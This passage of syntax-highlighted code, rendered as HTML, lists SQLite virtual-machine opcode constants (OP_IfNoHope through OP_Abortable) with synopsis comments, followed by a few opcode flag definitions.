</span></span><span style="display:flex;"><span>OP_IfNoHope      <span style="color:#f92672">=</span> <span style="color:#ae81ff">26</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_NoConflict    <span style="color:#f92672">=</span> <span style="color:#ae81ff">27</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_NotFound      <span style="color:#f92672">=</span> <span style="color:#ae81ff">28</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_Found         <span style="color:#f92672">=</span> <span style="color:#ae81ff">29</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_SeekRowid     <span style="color:#f92672">=</span> <span style="color:#ae81ff">30</span><span style="color:#75715e"># /* jump, synopsis: intkey=r[P3]               */</span>
</span></span><span style="display:flex;"><span>OP_NotExists     <span style="color:#f92672">=</span> <span style="color:#ae81ff">31</span><span style="color:#75715e"># /* jump, synopsis: intkey=r[P3]               */</span>
</span></span><span style="display:flex;"><span>OP_Last          <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IfSmaller     <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_SorterSort    <span style="color:#f92672">=</span> <span style="color:#ae81ff">34</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Sort          <span style="color:#f92672">=</span> <span style="color:#ae81ff">35</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Rewind        <span style="color:#f92672">=</span> <span style="color:#ae81ff">36</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_SorterNext    <span style="color:#f92672">=</span> <span style="color:#ae81ff">37</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Prev          <span style="color:#f92672">=</span> <span style="color:#ae81ff">38</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Next          <span style="color:#f92672">=</span> <span style="color:#ae81ff">39</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_IdxLE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">40</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_IdxGT         <span style="color:#f92672">=</span> <span style="color:#ae81ff">41</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_IdxLT         <span style="color:#f92672">=</span> <span style="color:#ae81ff">42</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_Or            <span style="color:#f92672">=</span> <span style="color:#ae81ff">43</span><span style="color:#75715e"># /* same as TK_OR, synopsis: r[P3]=(r[P1] || r[P2]) */</span>
</span></span><span style="display:flex;"><span>OP_And           <span style="color:#f92672">=</span> <span style="color:#ae81ff">44</span><span style="color:#75715e"># /* same as TK_AND, synopsis: r[P3]=(r[P1] &amp;&amp; r[P2]) */</span>
</span></span><span style="display:flex;"><span>OP_IdxGE         <span style="color:#f92672">=</span> <span style="color:#ae81ff">45</span><span style="color:#75715e"># /* jump, synopsis: key=r[P3@P4]               */</span>
</span></span><span style="display:flex;"><span>OP_RowSetRead    <span style="color:#f92672">=</span> <span style="color:#ae81ff">46</span><span style="color:#75715e"># /* jump, synopsis: r[P3]=rowset(P1)           */</span>
</span></span><span style="display:flex;"><span>OP_RowSetTest    <span style="color:#f92672">=</span> <span style="color:#ae81ff">47</span><span style="color:#75715e"># /* jump, synopsis: if r[P3] in rowset(P1) goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_Program       <span style="color:#f92672">=</span> <span style="color:#ae81ff">48</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_FkIfZero      <span style="color:#f92672">=</span> <span style="color:#ae81ff">49</span><span style="color:#75715e"># /* jump, synopsis: if fkctr[P1]==0 goto P2    */</span>
</span></span><span style="display:flex;"><span>OP_IsNull        <span style="color:#f92672">=</span> <span style="color:#ae81ff">50</span><span style="color:#75715e"># /* jump, same as TK_ISNULL, synopsis: if r[P1]==NULL goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_NotNull       <span style="color:#f92672">=</span> <span style="color:#ae81ff">51</span><span style="color:#75715e"># /* jump, same as TK_NOTNULL, synopsis: if r[P1]!=NULL goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_Ne            <span style="color:#f92672">=</span> <span style="color:#ae81ff">52</span><span style="color:#75715e"># /* jump, same as TK_NE, synopsis: IF r[P3]!=r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Eq            <span style="color:#f92672">=</span> <span style="color:#ae81ff">53</span><span style="color:#75715e"># /* jump, same as TK_EQ, synopsis: IF r[P3]==r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Gt            <span style="color:#f92672">=</span> <span style="color:#ae81ff">54</span><span style="color:#75715e"># /* jump, same as TK_GT, synopsis: IF r[P3]&gt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Le            <span style="color:#f92672">=</span> <span style="color:#ae81ff">55</span><span style="color:#75715e"># /* jump, same as TK_LE, synopsis: IF r[P3]&lt;=r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Lt            <span style="color:#f92672">=</span> <span style="color:#ae81ff">56</span><span style="color:#75715e"># /* jump, same as TK_LT, synopsis: IF r[P3]&lt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Ge            <span style="color:#f92672">=</span> <span style="color:#ae81ff">57</span><span style="color:#75715e"># /* jump, same as TK_GE, synopsis: IF r[P3]&gt;=r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_ElseEq        <span style="color:#f92672">=</span> <span style="color:#ae81ff">58</span><span style="color:#75715e"># /* jump, same as TK_ESCAPE                    */</span>
</span></span><span style="display:flex;"><span>OP_IfPos         <span style="color:#f92672">=</span> <span style="color:#ae81ff">59</span><span style="color:#75715e"># /* jump, synopsis: if r[P1]&gt;0 then r[P1]-=P3, goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_IfNotZero     <span style="color:#f92672">=</span> <span style="color:#ae81ff">60</span><span style="color:#75715e"># /* jump, synopsis: if r[P1]!=0 then r[P1]--, goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_DecrJumpZero  <span style="color:#f92672">=</span> <span style="color:#ae81ff">61</span><span style="color:#75715e"># /* jump, synopsis: if (--r[P1])==0 goto P2    */</span>
</span></span><span style="display:flex;"><span>OP_IncrVacuum    <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_VNext         <span style="color:#f92672">=</span> <span style="color:#ae81ff">63</span><span style="color:#75715e"># /* jump                                       */</span>
</span></span><span style="display:flex;"><span>OP_Filter        <span style="color:#f92672">=</span> <span style="color:#ae81ff">64</span><span style="color:#75715e"># /* jump, synopsis: if key(P3@P4) not in filter(P1) goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_PureFunc      <span style="color:#f92672">=</span> <span style="color:#ae81ff">65</span><span style="color:#75715e"># /* synopsis: r[P3]=func(r[P2@NP])             */</span>
</span></span><span style="display:flex;"><span>OP_Function      <span style="color:#f92672">=</span> <span style="color:#ae81ff">66</span><span style="color:#75715e"># /* synopsis: r[P3]=func(r[P2@NP])             */</span>
</span></span><span style="display:flex;"><span>OP_Return        <span style="color:#f92672">=</span> <span style="color:#ae81ff">67</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_EndCoroutine  <span style="color:#f92672">=</span> <span style="color:#ae81ff">68</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_HaltIfNull    <span style="color:#f92672">=</span> <span style="color:#ae81ff">69</span><span style="color:#75715e"># /* synopsis: if r[P3]=null halt               */</span>
</span></span><span style="display:flex;"><span>OP_Halt          <span style="color:#f92672">=</span> <span style="color:#ae81ff">70</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Integer       <span style="color:#f92672">=</span> <span style="color:#ae81ff">71</span><span style="color:#75715e"># /* synopsis: r[P2]=P1                         */</span>
</span></span><span style="display:flex;"><span>OP_Int64         <span style="color:#f92672">=</span> <span style="color:#ae81ff">72</span><span style="color:#75715e"># /* synopsis: r[P2]=P4                         */</span>
</span></span><span style="display:flex;"><span>OP_String        <span style="color:#f92672">=</span> <span style="color:#ae81ff">73</span><span style="color:#75715e"># /* synopsis: r[P2]=&#39;P4&#39; (len=P1)              */</span>
</span></span><span style="display:flex;"><span>OP_BeginSubrtn   <span style="color:#f92672">=</span> <span style="color:#ae81ff">74</span><span style="color:#75715e"># /* synopsis: r[P2]=NULL                       */</span>
</span></span><span style="display:flex;"><span>OP_Null          <span style="color:#f92672">=</span> <span style="color:#ae81ff">75</span><span style="color:#75715e"># /* synopsis: r[P2..P3]=NULL                   */</span>
</span></span><span style="display:flex;"><span>OP_SoftNull      <span style="color:#f92672">=</span> <span style="color:#ae81ff">76</span><span style="color:#75715e"># /* synopsis: r[P1]=NULL                       */</span>
</span></span><span style="display:flex;"><span>OP_Blob          <span style="color:#f92672">=</span> <span style="color:#ae81ff">77</span><span style="color:#75715e"># /* synopsis: r[P2]=P4 (len=P1)                */</span>
</span></span><span style="display:flex;"><span>OP_Variable      <span style="color:#f92672">=</span> <span style="color:#ae81ff">78</span><span style="color:#75715e"># /* synopsis: r[P2]=parameter(P1,P4)           */</span>
</span></span><span style="display:flex;"><span>OP_Move          <span style="color:#f92672">=</span> <span style="color:#ae81ff">79</span><span style="color:#75715e"># /* synopsis: r[P2@P3]=r[P1@P3]                */</span>
</span></span><span style="display:flex;"><span>OP_Copy          <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span><span style="color:#75715e"># /* synopsis: r[P2@P3+1]=r[P1@P3+1]            */</span>
</span></span><span style="display:flex;"><span>OP_SCopy         <span style="color:#f92672">=</span> <span style="color:#ae81ff">81</span><span style="color:#75715e"># /* synopsis: r[P2]=r[P1]                      */</span>
</span></span><span style="display:flex;"><span>OP_IntCopy       <span style="color:#f92672">=</span> <span style="color:#ae81ff">82</span><span style="color:#75715e"># /* synopsis: r[P2]=r[P1]                      */</span>
</span></span><span style="display:flex;"><span>OP_FkCheck       <span style="color:#f92672">=</span> <span style="color:#ae81ff">83</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ResultRow     <span style="color:#f92672">=</span> <span style="color:#ae81ff">84</span><span style="color:#75715e"># /* synopsis: output=r[P1@P2]                  */</span>
</span></span><span style="display:flex;"><span>OP_CollSeq       <span style="color:#f92672">=</span> <span style="color:#ae81ff">85</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_AddImm        <span style="color:#f92672">=</span> <span style="color:#ae81ff">86</span><span style="color:#75715e"># /* synopsis: r[P1]=r[P1]+P2                   */</span>
</span></span><span style="display:flex;"><span>OP_RealAffinity  <span style="color:#f92672">=</span> <span style="color:#ae81ff">87</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Cast          <span style="color:#f92672">=</span> <span style="color:#ae81ff">88</span><span style="color:#75715e"># /* synopsis: affinity(r[P1])                  */</span>
</span></span><span style="display:flex;"><span>OP_Permutation   <span style="color:#f92672">=</span> <span style="color:#ae81ff">89</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Compare       <span style="color:#f92672">=</span> <span style="color:#ae81ff">90</span><span style="color:#75715e"># /* synopsis: r[P1@P3] &lt;-&gt; r[P2@P3]            */</span>
</span></span><span style="display:flex;"><span>OP_IsTrue        <span style="color:#f92672">=</span> <span style="color:#ae81ff">91</span><span style="color:#75715e"># /* synopsis: r[P2] = coalesce(r[P1]==TRUE,P3) ^ P4 */</span>
</span></span><span style="display:flex;"><span>OP_ZeroOrNull    <span style="color:#f92672">=</span> <span style="color:#ae81ff">92</span><span style="color:#75715e"># /* synopsis: r[P2] = 0 OR NULL                */</span>
</span></span><span style="display:flex;"><span>OP_Offset        <span style="color:#f92672">=</span> <span style="color:#ae81ff">93</span><span style="color:#75715e"># /* synopsis: r[P3] = sqlite_offset(P1)        */</span>
</span></span><span style="display:flex;"><span>OP_Column        <span style="color:#f92672">=</span> <span style="color:#ae81ff">94</span><span style="color:#75715e"># /* synopsis: r[P3]=PX cursor P1 column P2     */</span>
</span></span><span style="display:flex;"><span>OP_TypeCheck     <span style="color:#f92672">=</span> <span style="color:#ae81ff">95</span><span style="color:#75715e"># /* synopsis: typecheck(r[P1@P2])              */</span>
</span></span><span style="display:flex;"><span>OP_Affinity      <span style="color:#f92672">=</span> <span style="color:#ae81ff">96</span><span style="color:#75715e"># /* synopsis: affinity(r[P1@P2])               */</span>
</span></span><span style="display:flex;"><span>OP_MakeRecord    <span style="color:#f92672">=</span> <span style="color:#ae81ff">97</span><span style="color:#75715e"># /* synopsis: r[P3]=mkrec(r[P1@P2])            */</span>
</span></span><span style="display:flex;"><span>OP_Count         <span style="color:#f92672">=</span> <span style="color:#ae81ff">98</span><span style="color:#75715e"># /* synopsis: r[P2]=count()                    */</span>
</span></span><span style="display:flex;"><span>OP_ReadCookie    <span style="color:#f92672">=</span> <span style="color:#ae81ff">99</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_SetCookie     <span style="color:#f92672">=</span><span style="color:#ae81ff">100</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ReopenIdx     <span style="color:#f92672">=</span><span style="color:#ae81ff">101</span><span style="color:#75715e"># /* synopsis: root=P2 iDb=P3                   */</span>
</span></span><span style="display:flex;"><span>OP_BitAnd        <span style="color:#f92672">=</span><span style="color:#ae81ff">102</span><span style="color:#75715e"># /* same as TK_BITAND, synopsis: r[P3]=r[P1]&amp;r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_BitOr         <span style="color:#f92672">=</span><span style="color:#ae81ff">103</span><span style="color:#75715e"># /* same as TK_BITOR, synopsis: r[P3]=r[P1]|r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_ShiftLeft     <span style="color:#f92672">=</span><span style="color:#ae81ff">104</span><span style="color:#75715e"># /* same as TK_LSHIFT, synopsis: r[P3]=r[P2]&lt;&lt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_ShiftRight    <span style="color:#f92672">=</span><span style="color:#ae81ff">105</span><span style="color:#75715e"># /* same as TK_RSHIFT, synopsis: r[P3]=r[P2]&gt;&gt;r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Add           <span style="color:#f92672">=</span><span style="color:#ae81ff">106</span><span style="color:#75715e"># /* same as TK_PLUS, synopsis: r[P3]=r[P1]+r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_Subtract      <span style="color:#f92672">=</span><span style="color:#ae81ff">107</span><span style="color:#75715e"># /* same as TK_MINUS, synopsis: r[P3]=r[P2]-r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Multiply      <span style="color:#f92672">=</span><span style="color:#ae81ff">108</span><span style="color:#75715e"># /* same as TK_STAR, synopsis: r[P3]=r[P1]*r[P2] */</span>
</span></span><span style="display:flex;"><span>OP_Divide        <span style="color:#f92672">=</span><span style="color:#ae81ff">109</span><span style="color:#75715e"># /* same as TK_SLASH, synopsis: r[P3]=r[P2]/r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Remainder     <span style="color:#f92672">=</span><span style="color:#ae81ff">110</span><span style="color:#75715e"># /* same as TK_REM, synopsis: r[P3]=r[P2]%r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_Concat        <span style="color:#f92672">=</span><span style="color:#ae81ff">111</span><span style="color:#75715e"># /* same as TK_CONCAT, synopsis: r[P3]=r[P2]+r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_OpenRead      <span style="color:#f92672">=</span><span style="color:#ae81ff">112</span><span style="color:#75715e"># /* synopsis: root=P2 iDb=P3                   */</span>
</span></span><span style="display:flex;"><span>OP_OpenWrite     <span style="color:#f92672">=</span><span style="color:#ae81ff">113</span><span style="color:#75715e"># /* synopsis: root=P2 iDb=P3                   */</span>
</span></span><span style="display:flex;"><span>OP_BitNot        <span style="color:#f92672">=</span><span style="color:#ae81ff">114</span><span style="color:#75715e"># /* same as TK_BITNOT, synopsis: r[P2]= ~r[P1] */</span>
</span></span><span style="display:flex;"><span>OP_OpenDup       <span style="color:#f92672">=</span><span style="color:#ae81ff">115</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_OpenAutoindex <span style="color:#f92672">=</span><span style="color:#ae81ff">116</span><span style="color:#75715e"># /* synopsis: nColumn=P2                       */</span>
</span></span><span style="display:flex;"><span>OP_String8       <span style="color:#f92672">=</span><span style="color:#ae81ff">117</span><span style="color:#75715e"># /* same as TK_STRING, synopsis: r[P2]=&#39;P4&#39;    */</span>
</span></span><span style="display:flex;"><span>OP_OpenEphemeral <span style="color:#f92672">=</span><span style="color:#ae81ff">118</span><span style="color:#75715e"># /* synopsis: nColumn=P2                       */</span>
</span></span><span style="display:flex;"><span>OP_SorterOpen    <span style="color:#f92672">=</span><span style="color:#ae81ff">119</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_SequenceTest  <span style="color:#f92672">=</span><span style="color:#ae81ff">120</span><span style="color:#75715e"># /* synopsis: if( cursor[P1].ctr++ ) pc = P2   */</span>
</span></span><span style="display:flex;"><span>OP_OpenPseudo    <span style="color:#f92672">=</span><span style="color:#ae81ff">121</span><span style="color:#75715e"># /* synopsis: P3 columns in r[P2]              */</span>
</span></span><span style="display:flex;"><span>OP_Close         <span style="color:#f92672">=</span><span style="color:#ae81ff">122</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ColumnsUsed   <span style="color:#f92672">=</span><span style="color:#ae81ff">123</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_SeekScan      <span style="color:#f92672">=</span><span style="color:#ae81ff">124</span><span style="color:#75715e"># /* synopsis: Scan-ahead up to P1 rows         */</span>
</span></span><span style="display:flex;"><span>OP_SeekHit       <span style="color:#f92672">=</span><span style="color:#ae81ff">125</span><span style="color:#75715e"># /* synopsis: set P2&lt;=seekHit&lt;=P3              */</span>
</span></span><span style="display:flex;"><span>OP_Sequence      <span style="color:#f92672">=</span><span style="color:#ae81ff">126</span><span style="color:#75715e"># /* synopsis: r[P2]=cursor[P1].ctr++           */</span>
</span></span><span style="display:flex;"><span>OP_NewRowid      <span style="color:#f92672">=</span><span style="color:#ae81ff">127</span><span style="color:#75715e"># /* synopsis: r[P2]=rowid                      */</span>
</span></span><span style="display:flex;"><span>OP_Insert        <span style="color:#f92672">=</span><span style="color:#ae81ff">128</span><span style="color:#75715e"># /* synopsis: intkey=r[P3] data=r[P2]          */</span>
</span></span><span style="display:flex;"><span>OP_RowCell       <span style="color:#f92672">=</span><span style="color:#ae81ff">129</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Delete        <span style="color:#f92672">=</span><span style="color:#ae81ff">130</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ResetCount    <span style="color:#f92672">=</span><span style="color:#ae81ff">131</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_SorterCompare <span style="color:#f92672">=</span><span style="color:#ae81ff">132</span><span style="color:#75715e"># /* synopsis: if key(P1)!=trim(r[P3],P4) goto P2 */</span>
</span></span><span style="display:flex;"><span>OP_SorterData    <span style="color:#f92672">=</span><span style="color:#ae81ff">133</span><span style="color:#75715e"># /* synopsis: r[P2]=data                       */</span>
</span></span><span style="display:flex;"><span>OP_RowData       <span style="color:#f92672">=</span><span style="color:#ae81ff">134</span><span style="color:#75715e"># /* synopsis: r[P2]=data                       */</span>
</span></span><span style="display:flex;"><span>OP_Rowid         <span style="color:#f92672">=</span><span style="color:#ae81ff">135</span><span style="color:#75715e"># /* synopsis: r[P2]=PX rowid of P1             */</span>
</span></span><span style="display:flex;"><span>OP_NullRow       <span style="color:#f92672">=</span><span style="color:#ae81ff">136</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_SeekEnd       <span style="color:#f92672">=</span><span style="color:#ae81ff">137</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_IdxInsert     <span style="color:#f92672">=</span><span style="color:#ae81ff">138</span><span style="color:#75715e"># /* synopsis: key=r[P2]                        */</span>
</span></span><span style="display:flex;"><span>OP_SorterInsert  <span style="color:#f92672">=</span><span style="color:#ae81ff">139</span><span style="color:#75715e"># /* synopsis: key=r[P2]                        */</span>
</span></span><span style="display:flex;"><span>OP_IdxDelete     <span style="color:#f92672">=</span><span style="color:#ae81ff">140</span><span style="color:#75715e"># /* synopsis: key=r[P2@P3]                     */</span>
</span></span><span style="display:flex;"><span>OP_DeferredSeek  <span style="color:#f92672">=</span><span style="color:#ae81ff">141</span><span style="color:#75715e"># /* synopsis: Move P3 to P1.rowid if needed    */</span>
</span></span><span style="display:flex;"><span>OP_IdxRowid      <span style="color:#f92672">=</span><span style="color:#ae81ff">142</span><span style="color:#75715e"># /* synopsis: r[P2]=rowid                      */</span>
</span></span><span style="display:flex;"><span>OP_FinishSeek    <span style="color:#f92672">=</span><span style="color:#ae81ff">143</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Destroy       <span style="color:#f92672">=</span><span style="color:#ae81ff">144</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Clear         <span style="color:#f92672">=</span><span style="color:#ae81ff">145</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ResetSorter   <span style="color:#f92672">=</span><span style="color:#ae81ff">146</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_CreateBtree   <span style="color:#f92672">=</span><span style="color:#ae81ff">147</span><span style="color:#75715e"># /* synopsis: r[P2]=root iDb=P1 flags=P3       */</span>
</span></span><span style="display:flex;"><span>OP_SqlExec       <span style="color:#f92672">=</span><span style="color:#ae81ff">148</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ParseSchema   <span style="color:#f92672">=</span><span style="color:#ae81ff">149</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_LoadAnalysis  <span style="color:#f92672">=</span><span style="color:#ae81ff">150</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_DropTable     <span style="color:#f92672">=</span><span style="color:#ae81ff">151</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_DropIndex     <span style="color:#f92672">=</span><span style="color:#ae81ff">152</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Real          <span style="color:#f92672">=</span><span style="color:#ae81ff">153</span><span style="color:#75715e"># /* same as TK_FLOAT, synopsis: r[P2]=P4       */</span>
</span></span><span style="display:flex;"><span>OP_DropTrigger   <span style="color:#f92672">=</span><span style="color:#ae81ff">154</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_IntegrityCk   <span style="color:#f92672">=</span><span style="color:#ae81ff">155</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_RowSetAdd     <span style="color:#f92672">=</span><span style="color:#ae81ff">156</span><span style="color:#75715e"># /* synopsis: rowset(P1)=r[P2]                 */</span>
</span></span><span style="display:flex;"><span>OP_Param         <span style="color:#f92672">=</span><span style="color:#ae81ff">157</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_FkCounter     <span style="color:#f92672">=</span><span style="color:#ae81ff">158</span><span style="color:#75715e"># /* synopsis: fkctr[P1]+=P2                    */</span>
</span></span><span style="display:flex;"><span>OP_MemMax        <span style="color:#f92672">=</span><span style="color:#ae81ff">159</span><span style="color:#75715e"># /* synopsis: r[P1]=max(r[P1],r[P2])           */</span>
</span></span><span style="display:flex;"><span>OP_OffsetLimit   <span style="color:#f92672">=</span><span style="color:#ae81ff">160</span><span style="color:#75715e"># /* synopsis: if r[P1]&gt;0 then r[P2]=r[P1]+max(0,r[P3]) else r[P2]=(-1) */</span>
</span></span><span style="display:flex;"><span>OP_AggInverse    <span style="color:#f92672">=</span><span style="color:#ae81ff">161</span><span style="color:#75715e"># /* synopsis: accum=r[P3] inverse(r[P2@P5])    */</span>
</span></span><span style="display:flex;"><span>OP_AggStep       <span style="color:#f92672">=</span><span style="color:#ae81ff">162</span><span style="color:#75715e"># /* synopsis: accum=r[P3] step(r[P2@P5])       */</span>
</span></span><span style="display:flex;"><span>OP_AggStep1      <span style="color:#f92672">=</span><span style="color:#ae81ff">163</span><span style="color:#75715e"># /* synopsis: accum=r[P3] step(r[P2@P5])       */</span>
</span></span><span style="display:flex;"><span>OP_AggValue      <span style="color:#f92672">=</span><span style="color:#ae81ff">164</span><span style="color:#75715e"># /* synopsis: r[P3]=value N=P2                 */</span>
</span></span><span style="display:flex;"><span>OP_AggFinal      <span style="color:#f92672">=</span><span style="color:#ae81ff">165</span><span style="color:#75715e"># /* synopsis: accum=r[P1] N=P2                 */</span>
</span></span><span style="display:flex;"><span>OP_Expire        <span style="color:#f92672">=</span><span style="color:#ae81ff">166</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_CursorLock    <span style="color:#f92672">=</span><span style="color:#ae81ff">167</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_CursorUnlock  <span style="color:#f92672">=</span><span style="color:#ae81ff">168</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_TableLock     <span style="color:#f92672">=</span><span style="color:#ae81ff">169</span><span style="color:#75715e"># /* synopsis: iDb=P1 root=P2 write=P3          */</span>
</span></span><span style="display:flex;"><span>OP_VBegin        <span style="color:#f92672">=</span><span style="color:#ae81ff">170</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_VCreate       <span style="color:#f92672">=</span><span style="color:#ae81ff">171</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_VDestroy      <span style="color:#f92672">=</span><span style="color:#ae81ff">172</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_VOpen         <span style="color:#f92672">=</span><span style="color:#ae81ff">173</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_VCheck        <span style="color:#f92672">=</span><span style="color:#ae81ff">174</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_VInitIn       <span style="color:#f92672">=</span><span style="color:#ae81ff">175</span><span style="color:#75715e"># /* synopsis: r[P2]=ValueList(P1,P3)           */</span>
</span></span><span style="display:flex;"><span>OP_VColumn       <span style="color:#f92672">=</span><span style="color:#ae81ff">176</span><span style="color:#75715e"># /* synopsis: r[P3]=vcolumn(P2)                */</span>
</span></span><span style="display:flex;"><span>OP_VRename       <span style="color:#f92672">=</span><span style="color:#ae81ff">177</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Pagecount     <span style="color:#f92672">=</span><span style="color:#ae81ff">178</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_MaxPgcnt      <span style="color:#f92672">=</span><span style="color:#ae81ff">179</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ClrSubtype    <span style="color:#f92672">=</span><span style="color:#ae81ff">180</span><span style="color:#75715e"># /* synopsis: r[P1].subtype = 0                */</span>
</span></span><span style="display:flex;"><span>OP_FilterAdd     <span style="color:#f92672">=</span><span style="color:#ae81ff">181</span><span style="color:#75715e"># /* synopsis: filter(P1) += key(P3@P4)         */</span>
</span></span><span style="display:flex;"><span>OP_Trace         <span style="color:#f92672">=</span><span style="color:#ae81ff">182</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_CursorHint    <span style="color:#f92672">=</span><span style="color:#ae81ff">183</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_ReleaseReg    <span style="color:#f92672">=</span><span style="color:#ae81ff">184</span><span style="color:#75715e"># /* synopsis: release r[P1@P2] mask P3         */</span>
</span></span><span style="display:flex;"><span>OP_Noop          <span style="color:#f92672">=</span><span style="color:#ae81ff">185</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Explain       <span style="color:#f92672">=</span><span style="color:#ae81ff">186</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>OP_Abortable     <span style="color:#f92672">=</span><span style="color:#ae81ff">187</span><span style="color:#75715e">#</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OPFLG_JUMP       <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x01</span><span style="color:#75715e">#  /* jump:  P2 holds jmp target */</span>
</span></span><span style="display:flex;"><span>OPFLG_IN1        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x02</span><span style="color:#75715e">#  /* in1:   P1 is an input */</span>
</span></span><span style="display:flex;"><span>OPFLG_IN2        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x04</span><span style="color:#75715e">#  /* in2:   P2 is an input */</span>
</span></span><span style="display:flex;"><span>OPFLG_IN3        <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08</span><span style="color:#75715e">#  /* in3:   P3 is an input */</span>
